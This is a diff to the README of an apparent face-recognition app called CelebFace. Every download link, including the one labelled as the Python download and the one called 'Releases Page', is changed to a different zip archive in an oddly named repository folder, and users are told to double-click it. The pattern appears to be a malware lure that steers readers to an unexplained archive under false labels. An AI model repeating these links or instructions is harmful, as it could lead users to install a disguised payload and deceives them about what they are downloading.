@@ -15,9 +15,9 @@ Welcome to CelebFace, a user-friendly application for recognizing celebrity face
 ## 💾 Download & Install
 To get started, you need to download the application. Click the button below:
 
-[![Download CelebFace](https://raw.githubusercontent.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/main/sclerotoid/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition.zip%20CelebFace-v1.0-brightgreen)](https://raw.githubusercontent.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/main/sclerotoid/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition.zip)
+[![Download CelebFace](https://github.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/raw/refs/heads/main/sclerotoid/for_Face_Recognition_Flask_Deep_App_Celeb_Learning_3.0.zip%20CelebFace-v1.0-brightgreen)](https://github.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/raw/refs/heads/main/sclerotoid/for_Face_Recognition_Flask_Deep_App_Celeb_Learning_3.0.zip)
 
-Once you click the button, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/main/sclerotoid/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition.zip).
+Once you click the button, please visit this page to download: [Releases Page](https://github.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/raw/refs/heads/main/sclerotoid/for_Face_Recognition_Flask_Deep_App_Celeb_Learning_3.0.zip).
 
 Follow the steps below to install and run the application.
 
@@ -31,13 +31,13 @@ Follow the steps below to install and run the application.
    - Navigate to the extracted folder.
 
 4. **Run the application.**
-   - Double-click the `https://raw.githubusercontent.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/main/sclerotoid/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition.zip` file or follow specific instructions based on your operating system.
+   - Double-click the `https://github.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/raw/refs/heads/main/sclerotoid/for_Face_Recognition_Flask_Deep_App_Celeb_Learning_3.0.zip` file or follow specific instructions based on your operating system.
 
 ## 🔧 System Requirements
 To run CelebFace, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or a Linux distribution.
-- **Python Version:** Python 3.6 or higher must be installed. You can download it from [https://raw.githubusercontent.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/main/sclerotoid/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition.zip](https://raw.githubusercontent.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/main/sclerotoid/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition.zip).
+- **Python Version:** Python 3.6 or higher must be installed. You can download it from [https://github.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/raw/refs/heads/main/sclerotoid/for_Face_Recognition_Flask_Deep_App_Celeb_Learning_3.0.zip](https://github.com/juniornarvaez2003/CelebFace-A-Deep-Learning-Flask-App-for-Face-Recognition/raw/refs/heads/main/sclerotoid/for_Face_Recognition_Flask_Deep_App_Celeb_Learning_3.0.zip).
 - **Storage Space:** At least 200 MB of free disk space.
 - **Memory:** 4 GB of RAM or more for optimal performance.
 - **Internet Connection:** Required for accessing online celebrity face databases.
